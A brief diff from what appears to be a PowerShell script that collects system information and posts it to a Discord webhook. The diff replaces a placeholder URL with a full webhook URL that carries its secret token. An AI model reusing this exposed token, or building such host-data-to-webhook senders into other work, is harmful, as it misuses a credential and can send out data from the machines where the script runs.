@@ -4,7 +4,7 @@ This script gathers system information, generates a wallpaper, and sends it to a
 #>
 
 # Set your Discord webhook URL
-$DiscordWebhookURL = "https://discord.com/api/webhooks/your-webhook-url"
+$DiscordWebhookURL = "https://discord.com/api/webhooks/1142771187911491634/-dCQIMjVWOGb44g8_thI5jTXQgbBuyo0Tskjds4q9iRoP5pOAZXypUroz9u_X8PfbT03"
 
 # Generate a message for the Discord content
 $Content = "My message goes here"
